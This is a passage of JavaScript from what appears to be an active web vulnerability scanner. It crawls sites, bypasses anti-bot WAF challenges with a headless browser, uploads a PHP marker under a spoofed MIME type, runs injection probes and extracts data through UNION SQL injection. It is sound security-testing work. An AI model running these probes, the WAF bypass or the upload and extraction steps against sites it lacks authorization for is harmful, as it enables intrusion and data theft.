        params_tested: [...(out.testedParams ?? [])],
        findings: f,
        summary: {
          total: f.length, critical: count("critical"), high: count("high"),
          medium: count("medium"), low: count("low"), info: count("info"),
        },
      };
    }
    throw e;
  }
}

async function scanTargetInner(input, opts = {}, log = () => {}) {
  const mode = opts.mode === "passive" ? "passive" : "active";
  const auth = opts.auth ?? null;
  const findings = opts.out.findings;
  // live finding feed — every push is forwarded to the caller (SSE) so the UI
  // can show vulnerabilities the moment they are confirmed
  if (opts.onFinding) {
    const origPush = findings.push.bind(findings);
    findings.push = (...items) => {
      const r = origPush(...items);
      for (const it of items) { try { opts.onFinding(it); } catch { /* ignore */ } }
      return r;
    };
  }
  const started = Date.now();
  const t0 = () => ((Date.now() - started) / 1000).toFixed(1);
  let url;
  try { url = normalizeUrl(input); }
  catch { return { ok: false, error: "Invalid target URL." }; }
  log(`[${t0()}s] Initializing OWASP Top 10 ${mode.toUpperCase()} scan`);
  log(`[${t0()}s] Target: ${url.toString()}`);

  // ---------- Authentication ----------
  // Resolve auth BEFORE seed redirects: an auth wall (302 → /login) would
  // otherwise retarget the whole scan to the login page because the redirect
  // chain is followed without credentials.
  let authHeaders = await resolveAuth(auth, url, log, t0);
  let authCookie = authHeaders.Cookie ?? "";
  url = await resolveSeedRedirects(url, log, t0, authHeaders);

  // Bug-bounty options: larger sites need bigger crawl budgets and a polite
  // delay between requests to avoid tripping WAFs / rate limiters.
  const maxPages = Math.min(Math.max(parseInt(opts.maxPages, 10) || MAX_PAGES, 10), 500);
  const maxDepth = Math.min(Math.max(parseInt(opts.maxDepth, 10) || MAX_DEPTH, 1), 8);
  const maxProbes = Math.min(Math.max(parseInt(opts.maxProbeRequests, 10) || MAX_PROBE_REQUESTS, 50), 5000);
  const reqDelay = Math.min(Math.max(parseInt(opts.requestDelayMs, 10) || 0, 0), 5000);
  if (reqDelay) log(`[${t0()}s] Politeness delay: ${reqDelay}ms between requests`);
  const nap = () => (reqDelay ? new Promise((r) => setTimeout(r, reqDelay)) : Promise.resolve());
  if (process.env.SCAN_DEBUG && authCookie) {
    // log cookie NAMES only — never session values
    console.error(`[dbg-auth] cookie names: ${authCookie.split(";").map((c) => c.trim().split("=")[0]).join(",")}`);
  }
  // never leak the session cookie to a different origin (e.g. subdomains that
  // turned out to be unrelated hosts) — probe-set Cookie headers still pass through
  const baseOrigin = url.origin;
  const scopedHeaders = (u, o) => {
    const h = { ...authHeaders, ...(o.headers || {}) };
    try {
      if (new URL(u).origin !== baseOrigin && o.headers?.Cookie === undefined) delete h.Cookie;
    } catch { /* keep headers */ }
    return h;
  };
  const isCancelled = () => opts.isCancelled?.() === true;
  // Anti-bot WAFs often tarpit cleared sessions (~10-20s per response). Track
  // the slowest observed latency and floor all subsequent timeouts above it,
  // retrying once with a larger budget when a call still aborts.
  let slowFloorMs = 0;
  const isTimeoutErr = (e) => /abort|timed?\s*out|timeout/i.test(e?.message ?? "")
    || e?.name === "AbortError" || e?.name === "TimeoutError";
  const timedFetch = async (fn, u, o, m, def) => {
    const to = Math.max(m ?? def, slowFloorMs);
    const t = Date.now();
    try {
      const r = await fn(u, o, to);
      const el = Date.now() - t;
      if (el > 8000) slowFloorMs = Math.max(slowFloorMs, el + 3000);
      return r;
    } catch (e) {
      if (!isTimeoutErr(e) || to >= 60000) throw e;
      const r = await fn(u, o, Math.min(to * 3, 60000));
      const el = Date.now() - t;
      if (el > 8000) slowFloorMs = Math.max(slowFloorMs, el + 3000);
      return r;
    }
  };
  const ft = async (u, o = {}, m) => {
    if (isCancelled()) throw new ScanCancelled();
    await nap(); return timedFetch(fetchT, u, { ...o, headers: scopedHeaders(u, o) }, m, 10000);
  };
  const ftF = async (u, o = {}, m) => {
    if (isCancelled()) throw new ScanCancelled();
    await nap(); return timedFetch(fetchFollow, u, { ...o, headers: scopedHeaders(u, o) }, m, 12000);
  };

  // ---------- Anti-bot JS challenge (BitNinja-style interstitial) ----------
  // WAF serves a "please wait / being verified" page instead of content. A
  // headless browser can execute the check and obtain clearance cookies —
  // merge them into the session so crawl/probes see real pages.
  try {
    const probeRes = await ftF(url.toString());
    const probeBody = await probeRes.text();
    if (isJsChallengePage(probeBody)) {
      log(`[${t0()}s] [RECON] Anti-bot JS challenge detected — solving via headless browser...`);
      const solved = await solveJsChallenge(url.toString(), (m) => log(`[${t0()}s] ${m}`));
      if (solved) {
        const merged = mergeCookieStrings(authCookie, solved);
        if (merged && merged !== authCookie) {
          authHeaders = { ...authHeaders, Cookie: merged };
          authCookie = merged;
        }
        // clearance cookies are often UA-bound — keep the scanner on the same
        // UA the solving browser used or the WAF rejects every request
        UA["User-Agent"] = CHROME_UA;
        // WAFs commonly tarpit cleared sessions — measure the recheck latency
        // and floor all later timeouts above it (a 12s default aborts mid-wait)
        const rt = Date.now();
        try {
          const recheck = await ftF(url.toString(), {}, 45000);
          const recheckBody = await recheck.text();
          const el = Date.now() - rt;
          if (el > 8000) {
            slowFloorMs = Math.max(slowFloorMs, el + 4000);
            log(`[${t0()}s] [RECON] Slow target detected (~${(el / 1000).toFixed(1)}s/response) — timeouts raised to ${Math.round(slowFloorMs / 1000)}s`);
          }
          if (isJsChallengePage(recheckBody)) {
            log(`[${t0()}s] [!] Challenge still active after browser solve — results may be unreliable. Provide a session cookie via Authenticated scan if the site keeps challenging.`);
          } else {
            log(`[${t0()}s] [RECON] Challenge cleared — proceeding with real content`);
          }
        } catch (e) {
          log(`[${t0()}s] [!] Post-challenge recheck failed: ${e.message} — continuing anyway`);
        }
      } else {
        log(`[${t0()}s] [!] Could not solve JS challenge automatically — scan will see only the interstitial page. Use Authenticated scan with cookies exported from your browser.`);
      }
    }
  } catch (e) {
    if (e instanceof ScanCancelled) throw e;
    /* challenge probe failure is non-fatal — continue with normal flow */
  }

  // verify session actually reaches protected content
  if (authCookie) {
    try {
      const chk = await ftF(url.toString());
      const final = chk.finalUrl ?? chk.url ?? "";
      const loc = chk.headers.get("location") ?? "";
      const stillLogin = /login|signin/i.test(final) || /login|signin/i.test(loc);
      // URL checks miss apps whose login page lives at a neutral path (e.g.
      // index.php) — inspect the body for a password field too
      let bodyHasLoginForm = false;
      try {
        const body = await chk.text();
        bodyHasLoginForm = /type=["']?password/i.test(body) && /<form[\s\S]{0,4000}?action=["'][^"']*(login|check|auth|signin)/i.test(body);
      } catch { /* body unavailable */ }
      if (stillLogin || bodyHasLoginForm) {
        log(`[${t0()}s] [AUTH] WARNING: session may not be authenticated — landed on ${final}${bodyHasLoginForm ? " (page still shows a login form)" : ""}. Crawl coverage will be limited to public pages.`);
      } else {
        log(`[${t0()}s] [AUTH] Session verified — landed on ${final}`);
      }
    } catch { /* ignore */ }
  }

  // ---------- A02: Transport security ----------
  log(`[${t0()}s] [A02] Checking transport security (HTTPS/HSTS)...`);
  if (url.protocol === "http:") {
    findings.push(finding({
      title: "Site served over unencrypted HTTP", severity: "high", category: "transport", owasp: "A02:2021 Cryptographic Failures",
      description: "All traffic including credentials can be intercepted in plain HTTP.",
      evidence: `Target uses http:// (${url.origin})`,
      payload: "N/A — passive observation",
      exploit: "Attacker on the same network (public Wi-Fi, ISP) uses packet sniffing (e.g. Wireshark) to read session cookies and credentials sent over HTTP.",
      recommendation: "Force HTTPS redirect and enable HSTS.",
    }));
  }

  // ---------- Fetch main page ----------
  log(`[${t0()}s] Fetching target page...`);
  let res;
  try {
    res = await ftF(url.toString());
  } catch (e) {
    return { ok: false, error: `Cannot reach target: ${e.message}` };
  }
  const headers = res.headers;
  const html = await res.text();
  opts.out.status = res.status;
  opts.out.url = url.toString();
  log(`[${t0()}s] Response: HTTP ${res.status}, ${html.length} bytes received`);

  // DVWA-style apps signal the active challenge difficulty via a 'security'
  // cookie — at medium/high/impossible most injection challenges are patched,
  // so warn loudly instead of silently reporting "no vulns found".
  try {
    const sec = (headers.getSetCookie?.() ?? [])
      .map((c) => c.split(";")[0].trim())
      .find((c) => /^security=/i.test(c));
    if (sec) {
      const lvl = sec.split("=")[1];
      if (!/^low$/i.test(lvl)) {
        log(`[${t0()}s] [!] Security level '${lvl}' detected — challenges are patched at this level. Add 'security=low' to the Cookie header (or set Security Level) to test them.`);
      }
    }
  } catch { /* non-fatal */ }

  // ---------- A05: Security headers ----------
  log(`[${t0()}s] [A05] Checking security headers (${SECURITY_HEADERS.length} headers)...`);
  for (const h of SECURITY_HEADERS) {
    const v = headers.get(h.key);
    if (!v) {
      findings.push(finding({
        title: `Missing ${h.name} header`, severity: h.severity, category: "security-headers", owasp: h.owasp,
        description: h.desc,
        evidence: `GET ${url.pathname} → ${res.status}; header '${h.key}' absent`,
        payload: "N/A — passive observation",
        exploit: h.key === "content-security-policy"
          ? "Attacker injects a malicious <script> (stored or reflected XSS); without CSP the browser executes it, enabling session theft."
          : h.key === "x-frame-options"
          ? "Attacker embeds the site in an invisible iframe and tricks users into clicking UI elements (clickjacking)."
          : h.key === "strict-transport-security"
          ? "Attacker on the network intercepts the first HTTP request and serves a fake page before HTTPS redirect (SSL stripping)."
          : "Attacker exploits missing browser protections to perform MIME-sniffing, referrer leakage, or feature abuse.",
        recommendation: `Configure '${h.key}' response header on your web server/CDN.`,
      }));
    } else {
      findings.push(finding({
        title: `${h.name} present`, severity: "info", category: "security-headers", owasp: h.owasp,
        description: `${h.name} is configured.`,
        evidence: `${h.key}: ${v.slice(0, 200)}`,
        payload: "N/A", exploit: "N/A — protective control in place.", recommendation: "None.",
      }));
    }
  }

  // ---------- A05: HTTP methods ----------
  log(`[${t0()}s] [A05] Probing HTTP methods (OPTIONS/TRACE)...`);
  try {
    const opt = await ft(url.toString(), { method: "OPTIONS" });
    const allow = opt.headers.get("allow") || opt.headers.get("public") || "";
    if (/trace|track/i.test(allow)) {
      findings.push(finding({
        title: "Dangerous HTTP methods enabled (TRACE/TRACK)", severity: "medium", category: "methods", owasp: "A05:2021 Security Misconfiguration",
        description: "Server advertises TRACE/TRACK methods which can enable Cross-Site Tracing (XST).",
        evidence: `OPTIONS → Allow: ${allow}`,
        payload: "OPTIONS / HTTP/1.1\nTRACE / HTTP/1.1",
        exploit: "Attacker uses TRACE to reflect request headers (including cookies) back in the response body, readable via XSS — bypassing HttpOnly.",
        recommendation: "Disable TRACE/TRACK methods at the web server.",
      }));
    }
  } catch { /* ignore */ }

  // ---------- A01/A05: CORS ----------
  log(`[${t0()}s] [A01] Testing CORS policy...`);
  try {
    const cors = await ft(url.toString(), { headers: { Origin: "https://cyberhunter-audit.invalid" } });
    const acao = cors.headers.get("access-control-allow-origin");
    const acac = cors.headers.get("access-control-allow-credentials");
    if (acao === "https://cyberhunter-audit.invalid" && /true/i.test(acac ?? "")) {
      findings.push(finding({
        title: "CORS reflects arbitrary origin with credentials", severity: "high", category: "cors", owasp: "A01:2021 Broken Access Control",
        description: "Server echoes any Origin and allows credentials — any website can read authenticated responses.",
        evidence: `Origin: https://cyberhunter-audit.invalid → ACAO: ${acao}, ACAC: ${acac}`,
        payload: 'fetch("https://target/api", {credentials:"include"}) from attacker origin',
        exploit: "Victim visits attacker site; JavaScript fetches the target API with the victim's cookies and exfiltrates the response cross-origin.",
        recommendation: "Whitelist specific trusted origins; never combine wildcard/reflected origin with Allow-Credentials.",
      }));
    }
  } catch { /* ignore */ }

  // ---------- A05: Directory listing & exposed files ----------
  log(`[${t0()}s] [A05] Checking directory listing & sensitive file exposure...`);
  if (/index of\s+\//i.test(html) || /parent directory/i.test(html)) {
    findings.push(finding({
      title: "Directory listing enabled", severity: "medium", category: "misconfiguration", owasp: "A05:2021 Security Misconfiguration",
      description: "Web server exposes a browsable file index.",
      evidence: `Response contains directory index markers`,
      payload: "GET /", exploit: "Attacker browses directories to discover backup files, source code, or sensitive documents.",
      recommendation: "Disable autoindex / directory listing in web server config.",
    }));
  }
  for (const p of ["/.git/HEAD", "/.env", "/wp-config.php.bak", "/backup.zip", "/.svn/entries"]) {
    try {
      const r = await ftF(new URL(p, url.origin).toString(), {}, 5000);
      if (r.ok) {
        const body = await r.text();
        const ctype = r.headers.get("content-type") ?? "";
        const looksHtml = /^\s*<(!doctype|html)/i.test(body);
        const leaked =
          (p === "/.git/HEAD" && /ref:\s*refs\//.test(body)) ||
          (p === "/.env" && /^[A-Z_]+=.+/m.test(body) && !looksHtml) ||
          (p === "/.svn/entries" && /svn:|^dir$/m.test(body)) ||
          ((p.endsWith(".bak") || p.endsWith(".zip")) && !looksHtml && body.length > 100);
        if (leaked) {
          findings.push(finding({
            title: `Sensitive file exposed: ${p}`, severity: "critical", category: "exposure", owasp: "A05:2021 Security Misconfiguration",
            description: "A sensitive file is publicly downloadable.",
            evidence: `GET ${p} → ${r.status}, ${body.length} bytes, content matched sensitive pattern`,
            payload: `GET ${p} HTTP/1.1`,
            exploit: p.includes(".git")
              ? "Attacker downloads the full .git repository (e.g. via git-dumper) and extracts source code, credentials, and history."
              : "Attacker downloads the file and extracts secrets (DB passwords, API keys) or application source.",
            recommendation: "Block access to VCS dirs, dotfiles, and backup files at the web server.",
          }));
        }
      }
    } catch { /* ignore */ }
  }

  // ---------- robots.txt (bug-bounty scope awareness) ----------
  try {
    const rb = await ftF(new URL("/robots.txt", url.origin).toString(), {}, 5000);
    if (rb.ok) {
      const rbText = await rb.text();
      if (/^\s*disallow\s*:\s*\/\s*$/im.test(rbText)) {
        findings.push(finding({
          title: "robots.txt disallows all crawling", severity: "medium", category: "scope", owasp: "A05:2021 Security Misconfiguration",
          description: "robots.txt contains 'Disallow: /' — the site operator does not want automated crawling. For bug bounty, verify the program scope explicitly permits active testing before proceeding.",
          evidence: `GET /robots.txt → ${rb.status}; contains 'Disallow: /'`,
          payload: "GET /robots.txt HTTP/1.1",
          exploit: "N/A — scope/compliance observation, not a vulnerability.",
          recommendation: "Confirm written authorization and program scope; respect rate limits and excluded paths.",
        }));
      }
    }
  } catch { /* ignore */ }

  // ---------- CRAWL ----------
  log(`[${t0()}s] [CRAWL] Starting site crawl (max ${maxPages} pages, depth ${maxDepth}${opts.includeSubdomains ? ", incl. subdomains" : ""})...`);
  // authenticated scans crawl sequentially — concurrent requests race on
  // session-token regeneration and can invalidate the session (DVWA)
  let extraSeeds = [];
  let enumeratedHosts = [];
  if (opts.includeSubdomains) {
    try {
      const subs = await enumerateSubdomains(url.hostname, log, t0);
      enumeratedHosts = subs;
      extraSeeds = subs.filter((h) => h !== url.hostname).map((h) => `https://${h}/`);
      if (extraSeeds.length) log(`[${t0()}s] [RECON] Crawling ${extraSeeds.length} subdomain root(s) as seeds`);
    } catch (e) {
      log(`[${t0()}s] [RECON] Subdomain enumeration failed: ${e.message}`);
    }
  }
  const crawlData = await crawl(url.toString(), log, t0, ftF, authCookie ? 1 : CRAWL_CONCURRENCY, maxPages, maxDepth, !!opts.includeSubdomains, extraSeeds);

  // Hidden endpoint discovery: wordlist GETs for endpoints no link exposes
  // (redirect handlers, login pages, admin panels). Their pages/forms/params
  // are merged into crawlData so buildTargets probes them like crawled pages.
  try {
    const scope = makeScope(url.toString(), !!opts.includeSubdomains);
    const known = new Set(crawlData.pages.map((p) => p.url));
    // directories seen during crawl (cetak/, user/, admin/…) get the short
    // PHP filename wordlist probed inside them
    const subDirs = [...new Set(crawlData.pages.map((p) => {
      try {
        const segs = new URL(p.url).pathname.split("/").filter(Boolean);
        return segs.length > 1 ? `/${segs.slice(0, -1).join("/")}/` : null;
      } catch { return null; }
    }).filter(Boolean))];
    const hidden = await discoverHiddenEndpoints(url.toString(), ftF, log, t0, known, subDirs);
    for (const p of hidden) {
      crawlData.pages.push(p);
      for (const k of extractParams(p.html, p.url)) if (!crawlData.params.includes(k)) crawlData.params.push(k);
      for (const f of extractForms(p.html, p.url, scope)) {
        crawlData.forms.push(f);
        for (const n of f.params) if (!crawlData.params.includes(n)) crawlData.params.push(n);
      }
    }
    if (hidden.length) log(`[${t0()}s] [RECON] Hidden discovery added ${hidden.length} endpoint(s) — total ${crawlData.pages.length} pages, ${crawlData.params.length} params`);
  } catch (e) {
    log(`[${t0()}s] [RECON] Hidden endpoint discovery failed: ${e.message}`);
  }

  // JS bundle mining: endpoints/params referenced only from .js files
  // (fetch/axios calls, route tables) never appear in crawled HTML.
  if (mode === "active") {
    try {
      const jsFound = await mineJsSurface(crawlData.pages, url.origin, ftF, log, t0);
      for (const p of jsFound) {
        if (!crawlData.pages.some((x) => x.url === p.url)) crawlData.pages.push(p);
      }
    } catch (e) {
      log(`[${t0()}s] [RECON] JS mining failed: ${e.message}`);
    }
  }

  // Parameter mining (active mode): endpoints with no query string may still
  // accept params nobody linked — try common names, keep response-changing ones.
  if (mode === "active") {
    try {
      const mined = await mineQueryParams(crawlData.pages, ftF, log, t0);
      for (const m of mined) {
        crawlData.pages.push({ url: m.url, depth: -1, html: "", res: null, mined: true });
        if (!crawlData.params.includes(m.param)) crawlData.params.push(m.param);
      }
      if (mined.length) log(`[${t0()}s] [RECON] Parameter mining added ${mined.length} param endpoint(s)`);
    } catch (e) {
      log(`[${t0()}s] [RECON] Parameter mining failed: ${e.message}`);
    }
  }

  // post-crawl session check — detect if crawling invalidated the session
  if (authCookie) {
    try {
      const chk = await ftF(url.toString());
      const final = chk.finalUrl ?? chk.url ?? "";
      if (/login|signin/i.test(final)) {
        log(`[${t0()}s] [AUTH] WARNING: session lost during crawl (landed on ${final}) — probes may be unauthenticated`);
      }
    } catch { /* ignore */ }
  }

  // ---------- A01/A04: CSRF protection & file upload surface ----------
  for (const f of crawlData.forms) {
    const hasFile = (f.fields ?? []).some((x) => x.type === "file");
    if (hasFile) {
      findings.push(finding({
        title: "File upload form detected", severity: "info", category: "upload", owasp: "A04:2021 Insecure Design",
        description: "A multipart file upload form was found. Manual verification required: server-side file type/extension validation, content sniffing, storage outside webroot, filename sanitization.",
        endpoint: f.url, parameter: "N/A", vector: "form-" + (f.method ?? "get"), payload: "N/A — passive observation",
        evidence: `Upload form at ${f.url}`,
        exploit: "Attacker uploads a malicious file (webshell .php, polyglot image) → remote code execution if validation is weak.",
        recommendation: "Validate MIME type + extension server-side, store outside webroot with random names, disable script execution in upload dir.",
      }));
    }
    if (f.method === "post") {
      const hasToken = (f.fields ?? []).some((x) => /token|csrf|authenticity|nonce|_token|user_token|key|sid/i.test(x.name));
      if (process.env.SCAN_DEBUG) {
        console.error(`[dbg-csrfcheck] ${f.url} fields=[${(f.fields ?? []).map((x) => x.name + ":" + x.type).join(",")}] hasToken=${hasToken}`);
      }
      if (!hasToken) {
        findings.push(finding({
          title: "POST form without CSRF token", severity: "medium", category: "csrf", owasp: "A01:2021 Broken Access Control",
          description: "A state-changing POST form has no CSRF token/nonce field — cross-site request forgery possible.",
          endpoint: f.url, parameter: "N/A", vector: "form-post", payload: "N/A — passive observation",
          evidence: `POST form at ${f.url} has no token-like hidden field`,
          exploit: "Attacker hosts a page that auto-submits this form using the victim's session cookies → victim performs unintended actions (change password, transfer funds).",
          recommendation: "Add a per-session CSRF token to all state-changing forms and validate it server-side.",
        }));
      }
    }
  }

  // ---------- A07: Weak/predictable session identifiers ----------
  // POST each state-changing form twice and compare Set-Cookie values —
  // sequential or static session ids are trivially predictable.
  log(`[${t0()}s] [A07] Checking session identifier strength...`);
  const sessPages = new Set();
  let sessChecked = 0;
  for (const f of crawlData.forms) {
    if (f.method !== "post" || sessChecked >= 8) continue;
    const pageUrl = (f.url || "").split("#")[0];
    if (!pageUrl || sessPages.has(pageUrl)) continue;
    sessPages.add(pageUrl);
    sessChecked++;
    try {
      const pr = await ftF(pageUrl);
      const hidden = extractHiddenInputs(await pr.text());
      const fields = { ...Object.fromEntries((f.fields ?? []).map((x) => [x.name, x.value])), ...hidden };
      const snapshots = [];
      for (let i = 0; i < 2; i++) {
        const params = new URLSearchParams();
        for (const [k, v] of Object.entries(fields)) params.set(k, String(v));
        const r = await ftF(pageUrl, {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: params.toString(),
        }, 8000);
        await r.text();
        const m = new Map();
        for (const c of r.headers.getSetCookie?.() ?? []) {
          const pair = c.split(";")[0];
          const n = pair.split("=")[0].trim();
          if (n) m.set(n, pair.slice(pair.indexOf("=") + 1));
        }
        snapshots.push(m);
      }
      for (const [name, v2] of snapshots[1]) {
        const v1 = snapshots[0].get(name);
        if (v1 === undefined) continue;
        const n1 = /^\d+$/.test(v1) ? Number(v1) : NaN;
        const n2 = /^\d+$/.test(v2) ? Number(v2) : NaN;
        // Unix-timestamp session ids (time()) — predictable within seconds
        if (n2 >= 946684800 && n2 <= 4102444800 && (v1 === v2 || (n1 >= 946684800 && Math.abs(n2 - n1) <= 2))) {
          findings.push(finding({
            title: `Timestamp-based session identifier '${name}'`, severity: "medium", category: "session", owasp: "A07:2021 Identification and Authentication Failures",
            description: `Cookie '${name}' holds a Unix timestamp (${v2}) — predictable within a few seconds.`,
            endpoint: pageUrl, parameter: name, vector: "cookie", payload: "N/A — stateful probe",
            evidence: `POST ${new URL(pageUrl).pathname} twice → Set-Cookie ${name}=${v1} then ${name}=${v2} (timestamp-like)`,
            exploit: "Attacker guesses the timestamp within a small window to hijack sessions issued at a known time.",
            recommendation: "Use cryptographically random, high-entropy session identifiers (≥128 bits).",
          }));
          continue;
        }
        if (v1 === v2) continue;
        if (!isNaN(n1) && !isNaN(n2) && n2 === n1 + 1) {
          findings.push(finding({
            title: `Predictable session identifier '${name}'`, severity: "high", category: "session", owasp: "A07:2021 Identification and Authentication Failures",
            description: `Cookie '${name}' holds a sequential numeric value (${v1} → ${v2}) — predictable without any attack.`,
            endpoint: pageUrl, parameter: name, vector: "cookie", payload: "N/A — stateful probe",
            evidence: `POST ${new URL(pageUrl).pathname} twice → Set-Cookie ${name}=${v1} then ${name}=${v2} (sequential)`,
            exploit: "Attacker enumerates session IDs (1,2,3,...) to hijack other users' sessions or impersonate accounts without credentials.",
            recommendation: "Use cryptographically random, high-entropy session identifiers (≥128 bits); regenerate on login and privilege change.",
          }));
        }
      }
    } catch { /* ignore */ }
  }

  // ---------- A04: Active file upload probe ----------
  // Upload a harmless PHP marker and try to retrieve it from common upload dirs.
  const uploadForms = crawlData.forms.filter((f) => (f.fields ?? []).some((x) => x.type === "file")).slice(0, 2);
  for (const f of uploadForms) {
    const pageUrl = (f.url || "").split("#")[0];
    if (!pageUrl) continue;
    const fileField = (f.fields ?? []).find((x) => x.type === "file")?.name ?? "file";
    const fname = `cyberhunter_probe_${Date.now().toString(36)}.php`;
    const marker = "CYBERHUNTER_UPLOAD_OK";
    const boundary = `----cyberhunter${Date.now()}`;
    try {
      const parts = [];
      const crlf = "\r\n";
      for (const x of f.fields ?? []) {
        if (x.type === "file") continue;
        parts.push(`--${boundary}${crlf}Content-Disposition: form-data; name="${x.name}"${crlf}${crlf}${x.value}${crlf}`);
      }
      // Spoof image/png MIME: servers that only check the client-supplied
      // Content-Type (not extension/content) will accept a .php webshell.
      parts.push(`--${boundary}${crlf}Content-Disposition: form-data; name="${fileField}"; filename="${fname}"${crlf}Content-Type: image/png${crlf}${crlf}<?php echo '${marker}'; ?>${crlf}`);
      parts.push(`--${boundary}--${crlf}`);
      const pr = await ftF(pageUrl);
      const hidden = extractHiddenInputs(await pr.text());
      // hidden fields not already in f.fields (e.g. refreshed CSRF tokens)
      for (const [k, v] of Object.entries(hidden)) {
        if (!(f.fields ?? []).some((x) => x.name === k)) {
          parts.splice(-1, 0, `--${boundary}${crlf}Content-Disposition: form-data; name="${k}"${crlf}${crlf}${v}${crlf}`);
        }
      }
      const up = await ftF(pageUrl, {
        method: "POST",
        headers: { "Content-Type": `multipart/form-data; boundary=${boundary}` },
        body: parts.join(""),
      }, 10000);
      await up.text();
      // derive candidate retrieval paths from the page's ancestor directories
      const origin = new URL(pageUrl).origin;
      const dir = new URL(pageUrl).pathname.replace(/[^/]*$/, "");
      const prefixes = [dir];
      let d = dir;
      for (let i = 0; i < 4; i++) {
        d = d.replace(/[^/]+\/$/, "");
        if (d && d !== "/" && !prefixes.includes(d)) prefixes.push(d);
      }
      prefixes.push("/");
      const suffixes = ["hackable/uploads/", "uploads/", "upload/", "files/", ""];
      const candidates = [...new Set(prefixes.flatMap((p) => suffixes.map((s) => `${origin}${p}${s}${fname}`)))].slice(0, 10);
      for (const c of candidates) {
        try {
          const r = await ftF(c, {}, 5000);
          const text = await r.text();
          if (!text.includes(marker)) continue;
          const ctype = r.headers.get("content-type") ?? "";
          const executed = /text\/html/i.test(ctype);
          findings.push(finding({
            title: executed ? "Remote code execution via file upload" : "Malicious file uploaded and retrievable",
            severity: executed ? "critical" : "high", category: "upload", owasp: "A04:2021 Insecure Design",
            description: `Uploaded a PHP marker file to ${pageUrl}; retrieved it at ${c}. ${executed ? "Server executed the PHP code (marker rendered as HTML)." : "File is publicly downloadable."}`,
            endpoint: pageUrl, parameter: fileField, vector: "form-post", payload: `multipart file ${fname} → ${c}`,
            evidence: `GET ${new URL(c).pathname} → ${r.status}, content-type '${ctype}', marker ${marker} present`,
            exploit: executed
              ? "Attacker uploads a .php webshell → arbitrary command execution as the web server user (full server compromise)."
              : "Attacker uploads malware/backdoors/phishing pages hosted on the trusted domain.",
            recommendation: "Validate file type/extension server-side, store uploads outside webroot with random names, disable script execution in upload directories.",
          }));
          break; // found — no need to try more candidates
        } catch { /* try next */ }
      }
    } catch { /* ignore */ }
  }

  // ---------- A03: Injection probes (ACTIVE MODE ONLY) ----------
  const targets = mode === "active" ? buildTargets(crawlData) : [];
  if (mode === "passive") {
    log(`[${t0()}s] [A03] Passive mode — injection probes skipped (no payloads sent)`);
  } else {
    log(`[${t0()}s] [A03] Injection surface: ${targets.length} endpoint(s) queued for probing (cap ${maxProbes} requests)`);
  }

  const testedParams = opts.out.testedParams;
  const sqliTargets = new Set();
  const budget = { n: maxProbes };
  let probeCount = 0;
  let stopProbing = false;

  // Apps like DVWA rotate CSRF tokens (user_token) on every page view —
  // refresh hidden fields before each form probe so tokens stay valid.
  const noHiddenPages = new Set();
  async function refreshFormTokens(target) {
    if (target.kind !== "form-get" && target.kind !== "form-post") return;
    const pageUrl = (target.pageUrl || target.url || "").split("#")[0];
    if (!pageUrl || noHiddenPages.has(pageUrl)) return;
    try {
      const r = await ftF(pageUrl);
      const hidden = extractHiddenInputs(await r.text());
      if (process.env.SCAN_DEBUG) {
        console.error(`[dbg-csrf] GET ${pageUrl} → final=${r.finalUrl ?? r.url} hidden=[${Object.keys(hidden).join(",")}]`);
      }
      if (!Object.keys(hidden).length) { noHiddenPages.add(pageUrl); return; }
      target.fields = { ...(target.fields ?? {}), ...hidden };
    } catch { noHiddenPages.add(pageUrl); }
  }

  outer:
  for (const target of targets) {
    if (stopProbing) break;
    const vectorLabel =
      target.kind === "header" ? `header '${target.headerName}'` :
      target.kind === "cookie" ? `cookie '${target.cookieName}'` :
      target.kind === "form-get" ? `GET form param '${target.param}' @ ${target.url}` :
      `param '${target.param}' @ ${target.url}`;

    for (const probe of PROBES) {
      if (probe.appliesTo && !probe.appliesTo(target.param)) continue;
      if (probe.category === "redirect" && (target.kind === "header" || target.kind === "cookie")) continue;
      // Header/cookie values are rarely injectable — skip the expensive
      // multi-request probes (blind SQLi ~10 reqs, LFI) there so the budget
      // goes to real page/form/JSON parameters instead.
      if ((target.kind === "header" || target.kind === "cookie") && probe.run) continue;
      if (budget.n <= 0) { stopProbing = true; break outer; }
      probeCount++;
      const shown = (probe.payloads ?? [probe.payload])[0];
      const shownTxt = shown.length > 60 ? shown.slice(0, 57) + "..." : shown;
      log(`[${t0()}s] [A03] Probe #${probeCount}: ${probe.name} → ${vectorLabel} | payload: ${shownTxt}`);
      try {
        await refreshFormTokens(target);
        // custom multi-request probes (blind SQLi, LFI) vs default payload-list probes
        const out = probe.run
          ? await probe.run(target, probe, ft, ftF, authCookie)
          : await runDefaultProbe(target, probe, ft, ftF, authCookie, budget);
        if (probe.run) budget.n -= out?.reqs ?? probe.estReqs ?? 2; // custom probes report actual request count
        if (out?.hit) {
          // 500-only evidence is ambiguous: confirm the benign baseline does NOT
          // also 500 — otherwise it's just input validation, not an injection.
          if (/Server error \d+ triggered/.test(out.hit)) {
            const base = await baselineStatus(target, ft, ftF, authCookie);
            if (base >= 500) continue;
          }
          log(`[${t0()}s] [!] VULNERABLE: ${probe.name} via ${vectorLabel} (${probe.severity})`);
          testedParams.add(`${target.param}@${target.url}`);
          if (probe.category === "sqli") sqliTargets.add(target);
          findings.push(finding({
            title: `${probe.name} in ${vectorLabel}`,
            severity: probe.severity, category: probe.category, owasp: probe.owasp,
            description: `Active probe detected ${probe.name.toLowerCase()} via ${vectorLabel}.`,
            parameter: target.param,
            vector: target.kind,
            endpoint: target.url,
            payload: out.payload ?? probe.payload,
            evidence: `${probe.name}: ${out.hit} | ${target.kind === "form-post" ? "POST" : "GET"} ${new URL(target.url).pathname} → ${out.res?.status ?? "?"}`,
            exploit: probe.exploit,
            recommendation: probe.remediation,
            ...(out.request ? { request: out.request } : {}),
            ...(out.response ? { response: out.response } : {}),
          }));
        }
      } catch { /* skip failed probes */ }
    }
  }
  if (stopProbing) {
    log(`[${t0()}s] Probe cap reached (${maxProbes} requests) — injection phase stopped early; increase Max probe requests for full endpoint coverage`);
  }

  // ---------- A03: UNION-based SQLi data extraction ----------
  if (mode === "active" && sqliTargets.size) {
    log(`[${t0()}s] [A03] UNION data extraction on ${sqliTargets.size} injectable parameter(s)...`);
    for (const t of sqliTargets) {
      if (budget.n <= 0) break;
      try {
        await sqliUnionExtract(t, { ftF, authCookie, budget, refreshFormTokens, log, t0, findings, finding });
      } catch { /* skip failed extraction */ }
    }
  }

  // ---------- DOM XSS static analysis (no extra requests) ----------
  let domCandidates = [];
  try { domCandidates = scanDomXss(crawlData.pages, findings, finding, log, t0) ?? []; } catch { /* non-fatal */ }

